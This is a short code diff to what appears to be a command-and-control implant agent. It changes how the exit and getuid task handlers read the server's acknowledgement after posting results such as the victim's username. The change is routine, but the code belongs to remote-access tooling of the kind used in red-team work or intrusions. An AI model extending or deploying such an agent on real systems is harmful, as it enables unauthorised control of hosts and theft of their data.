@@ -31,7 +31,12 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 
 void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	if (task != NULL) {
-		perform_post(state, task, "", "success");
+		TaskPostReply reply = { 0 };
+		perform_post(state, task, &reply, "", "success");
+		
+		if (reply.success == 1) {
+			dprintf("Server acknowledged exit.");
+		}
 	}
 
 	HttpDestroy(state->http);
@@ -48,7 +53,12 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *username = cap->GetuidPicoEntrypoint();
 	
-	perform_post(state, task, username, "success"); // TODO check if username is null and perform post based on that
+	TaskPostReply reply = { 0 };
+	perform_post(state, task, &reply, username, "success"); // TODO check if username is null and perform post based on that
+	
+	if (reply.success == 1) {
+		dprintf("Server acknowledged getuid output.");
+	}
 }
 
 void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
